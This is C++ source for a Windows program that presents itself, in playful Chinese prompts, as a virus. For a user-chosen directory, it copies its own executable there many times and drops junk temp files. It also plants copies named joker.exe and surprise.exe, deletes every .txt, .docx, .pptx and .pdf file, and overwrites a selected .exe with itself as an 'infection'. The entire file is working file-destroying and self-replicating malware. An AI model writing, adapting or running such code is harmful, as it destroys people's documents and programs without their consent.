#include<stdio.h>
#include<io.h>
#include<iostream>
#include<fstream>
#include<ios>
#include<Windows.h>
#include<stdlib.h>
#include<string.h>
#include <direct.h>
using namespace std;

#define MAXSIZE 4096

#define MAXPATH 1024

const int BUFFER_SIZE=4;

char INFECT_PATH[100], DELETE_FILE1[100], DELETE_FILE2[100] , DELETE_FILE3[100],DELETE_FILE4[100],CREAT_EXE1[100],CREAT_EXE2[100],Virusfile[100],Targetfile[100] ; 
char dest[100];
char path[100][260];

void MakeRubbish(void);//制造垃圾文件 
void CreatEXE(void); // 制造exe垃圾文件 
void Remove(void);//将.txt 、docx、pptx、pdf文件删除 
void copyfile(char* infile,char *outfile); //复制文件内容 

void MakeRubbish(void) //制造垃圾文件 
{
	for (int j=1;j<=5;j++){
	
	    int i=0;
	    FILE *fp=NULL;
	    char* path=NULL;
	    char* NewName=NULL;
	    char tempname[]="XXXXXX";
	    path=INFECT_PATH;   
	    if(!_chdir(path)){ }
	    else
	    {
	        perror("Error: ");
	    }
	    NewName=_mktemp(tempname);
	    fp=fopen(NewName,"w");
	    fclose(fp);
 	}
}

void CreatEXE(void)  //创建exe垃圾文件 
{
    int i;
    char* s[2]={CREAT_EXE1,CREAT_EXE2};
    for(i=0;i<2;i++)
    {
        open(s[i],0x0100,0x0080);
        copyfile(Virusfile,s[i]);
    }
}

void Remove(void)  //删除所有的docx、pptx、txt、pdf文件 
{
    int done;
    int i;

    struct _finddata_t ffblk;
    char *documenttype[4] = {DELETE_FILE1,DELETE_FILE2,DELETE_FILE3,DELETE_FILE4}; 
    for (i = 0; i < 4; i++)
    {
        done = _findfirst(documenttype[i],&ffblk);
        while(done!=-1)
        {
            printf("delete %s\n",ffblk.name);
            remove(ffblk.name);                             
            while (!_findnext(done,&ffblk))
            {
                printf("delete %s\n",ffblk.name);
                remove(ffblk.name);                         
            }
            done = _findfirst(documenttype[i],&ffblk);
        }
        _findclose(done);
    }
}

void copyfile(char* infile,char* outfile)
{
    FILE *in,*out;
    in=fopen(infile,"r");
    out=fopen(outfile,"w");
    while(!feof(in))
    {
        fputc(fgetc(in),out);
    }
    fclose(in);
    fclose(out);
}


int fun(char *s)
{
    char t[100];
    int i, j;
    for(i=0; s[i]; i++)  /*将串s拷贝至串t*/
        t[i]=s[i];
    t[i]='\0';
    for(i=0,j=0; t[i]; i++)
    /*对于数字字符先写一个$符号，再写该数字字符*/
        if(t[i]=='\\')
        {
            s[j++]='\\';
            s[j++]=t[i];
        }
    /*对于非数字字符原样写入串s*/
        else
            s[j++]=t[i];
    s[j]='\0';  /*在串s结尾加结束标志*/
    return 0;
}
int FindEXE(){

	
	long Handle;
	char findstr[100];
	 strcpy(findstr, dest);
	 strcat(findstr,  "\\*.exe");
	struct _finddata_t FileInfo;
	if((Handle=_findfirst(findstr,&FileInfo))==-1L)
		printf("没有找到匹配的项目\n");
	else
	{
		int  i=1;
		strcpy(path[i],FileInfo.name);
		
		printf("%d %s\n",i,FileInfo.name);
		i++;
		while( _findnext(Handle,&FileInfo)==0){
			strcpy(path[i],FileInfo.name);
			printf("%d %s\n",i,FileInfo.name);
			i++; 
		}
		
		_findclose(Handle);
	}
	getchar();
	return 0;
	}
/*This is a flag:end*/
int main(void)
{
	//cout << _pgmptr << endl;
	strcpy(Virusfile,_pgmptr);
	fun(Virusfile);
	//cout <<Virusfile<<endl;/
	
	int N;
	do{
		printf("Halllllo! 我来搞破坏辣！\n\n");
		printf("请输入复制次数：");
		scanf("%d", &N);
		if(N > 100)  printf("------复制次数过大，改小一些喽------\n");
	}while(N > 100);
	

	int flag;
	do{
		printf("你要在哪里搞破坏嘞？\n输入目标地址：");
		scanf("%s", &dest);
		flag = access(dest, 0);
		if(flag != 0)  printf("------目标地址写错喽，重新写一下嗷------\n");
	}while(flag != 0);
	 strcpy(INFECT_PATH, dest);
	 strcpy(DELETE_FILE1, dest);
	 strcat(DELETE_FILE1,  "\\*.txt");
	 strcpy(DELETE_FILE2, dest);
	 strcat(DELETE_FILE2,  "\\*.docx");
	 strcpy(DELETE_FILE3, dest);
	 strcat(DELETE_FILE3,  "\\*.pptx");
	 strcpy(DELETE_FILE4, dest);
	 strcat(DELETE_FILE4,  "\\*.pdf");
	 strcpy(CREAT_EXE1, dest);
	 strcat(CREAT_EXE1,  "\\joker.exe");
	 strcpy(CREAT_EXE2, dest);
	 strcat(CREAT_EXE2,  "\\surprise.exe");
	 strcpy(Targetfile, dest);
	 strcat(Targetfile,  "\\test.exe");
	char stri[2];
	 for (int i=1;i<=N;i++){
		 
		 char Target[100];
		 char tmpBuf[4096] = { 0 };
		 strcpy(Target, dest);  //Target存储复制后的文件名 
		 strcat(Target, "\\OK");
		 itoa(i,stri,10);//10进制整数转字符串 
		 strcat(Target,stri);  //添加后缀文件名 
		 strcat(Target, ".exe");
		FILE *fp1 = fopen(Virusfile, "rb");  //打开病毒文件 
		FILE *fp2 = fopen(Target, "wb");  //打开要写入的目标文件 
		int count = 0;
		while ((count = fread(tmpBuf, sizeof(char), MAXSIZE, fp1))) 
		{
			//每次最多读4096个字节的内容
			fwrite(tmpBuf, sizeof(char), count, fp2);//把每次实际读到的数据写入目标文件
		}
		fclose(fp1);
		fclose(fp2);
	}


	printf("------文件完成复制！------\n");	

    MakeRubbish( );             //制造垃圾文件
    CreatEXE( );                //制造可执行程序
    Remove( );                  //删除文件
    cout<<endl;
    printf("在目标目录下搜索到如下exe文件，请输入要感染的文件号（输入0退出）\n");
    FindEXE();
    int num;
    scanf("%d",&num);
    if (num==0) {
    	system("pause");
   		return 0;
    }
	 char Target[100];
	 char tmpBuf[4096] = { 0 };
	 strcpy(Target, dest);
	 strcat(Target, "\\");
	 strcat(Target,path[num]);
	FILE *fp1 = fopen(Virusfile, "rb");
	FILE *fp2 = fopen(Target, "wb");
	int count = 0;
	while ((count = fread(tmpBuf, sizeof(char), MAXSIZE, fp1)))
	{
		//每次最多读4096个字节的内容
		fwrite(tmpBuf, sizeof(char), count, fp2);//把每次实际读到的数据写入目标文件
	}
	fclose(fp1);
	fclose(fp2);
    printf("感染成功\n"); 
    system("pause");
    return 0;
}

